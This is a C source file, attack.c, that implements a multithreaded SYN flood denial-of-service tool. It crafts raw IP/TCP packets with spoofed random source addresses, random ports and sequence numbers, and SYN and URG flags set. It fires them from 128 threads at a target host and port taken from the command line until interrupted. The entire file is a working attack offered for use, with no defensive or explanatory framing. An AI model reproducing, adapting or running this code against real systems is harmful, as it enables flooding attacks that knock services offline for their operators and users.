/*************************************************************************
	> File Name: attack.c
	> Author: yuxintao
	> Mail: 1921056015@qq.com 
	> Created Time: 2022年03月09日 星期三 16时12分55秒
 ************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <time.h>
#include <string.h>
#include <pthread.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
static inline unsigned int myrandom(int begin, int end);
static unsigned short Dos_cksum(unsigned short* data, int length);
static void Dos_syn();
static void* Dos_fun(void *argv);
#define MAXCHILD 128

static int alive;
static unsigned short dest_port;
static unsigned int dest;
static int PROTO_TCP;
static int rawsock;

static inline unsigned int myrandom(int begin, int end) {
	int gap = end - begin + 1;
	int ret = 0;
	srand((unsigned)time(NULL));
	ret = random() % gap + begin;
	return ret;
}

static unsigned short Dos_cksum(unsigned short* data, int length) {
	register int left = length;
	register unsigned short* word = data;
	register int sum = 0;
	unsigned short ret = 0;
	while (left > 1) {
		sum += *word;
		word++;
		left -= 2;
	}
	if (left == 1) {
		*(unsigned char*)(&ret) = *(unsigned char*)word;
		sum += ret;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	ret = ~sum;
	return (ret);
}


static void Dos_syn() {
	struct sockaddr_in to;
	struct dosseg_t{
		struct ip iph;
		struct tcphdr tcph;
		unsigned char data[8192];
	}dosseg;

	dosseg.iph.ip_v = 4;
	dosseg.iph.ip_hl = 5;
	dosseg.iph.ip_tos = 0;
	dosseg.iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
	dosseg.iph.ip_id = htons((getpid()));
	dosseg.iph.ip_off = 0;
	dosseg.iph.ip_p = PROTO_TCP;
	dosseg.iph.ip_sum = 0;
	dosseg.iph.ip_src.s_addr = (unsigned int)myrandom(0, 65535);
	dosseg.iph.ip_dst.s_addr = dest;
	dosseg.iph.ip_sum = Dos_cksum((unsigned short*)&dosseg.iph, sizeof(struct ip));

	dosseg.tcph.source = htons((unsigned short)myrandom(0, 65535));
	dosseg.tcph.dest = htons(dest_port);
	dosseg.tcph.seq = htonl(myrandom(0, 65535));
	dosseg.tcph.ack_seq = htonl(myrandom(0, 65535));
	dosseg.tcph.syn = 1;
	dosseg.tcph.urg = 1;
	dosseg.tcph.window = htons((unsigned short)myrandom(0, 65535));
	dosseg.tcph.check = 0;
	dosseg.tcph.urg_ptr = htons((unsigned short)myrandom(0, 65535));
	dosseg.tcph.check = Dos_cksum((unsigned short*)&dosseg.tcph, sizeof(struct tcphdr) + 1);
	
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(0);

	sendto(rawsock, &dosseg, sizeof(struct ip) + sizeof(struct tcphdr) + 1, 0, (struct sockaddr*)&to, sizeof(struct sockaddr));
}

static void* Dos_fun(void* argv) {
	while (alive) {
		Dos_syn();
	}
}

static void Dos_sig(int sign) {
	alive = 0;
}

int main(int argc, char** argv) {
	if (argc < 3) 
		return -1;
	//set data
	dest = inet_addr(argv[1]);
	if (dest == INADDR_NONE) {
		struct hostent* host = NULL;
		host = gethostbyname(argv[1]);
		if (host == NULL) {
			perror("gethostbyname");
			return -1;
		}
		memcpy((char*)&dest, host->h_addr, host->h_length);
	}
	dest_port = atoi(argv[2]);
	alive = 1;
	signal(SIGINT, Dos_sig);

	//get tdp protocol
	struct protoent *protocol = NULL;
	char protoname[] = "tcp";
	protocol = getprotobyname(protoname);
	if (protocol == NULL) {
		perror("getprotobyname");
		return -1;
	}
	PROTO_TCP = protocol->p_proto;
	//create socket
	rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (rawsock < 0) {
		rawsock = socket(AF_INET,SOCK_RAW, PROTO_TCP);
	}
	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));

	//start thread
	int i;
	pthread_t pthread[MAXCHILD];
	for (i = 0; i < MAXCHILD; ++i)
		pthread_create(&pthread[i], NULL, Dos_fun, NULL);
	for (i = 0; i < MAXCHILD; ++i)
		pthread_join(pthread[i], NULL);

	//close socket
	close(rawsock);
	return 0;
}
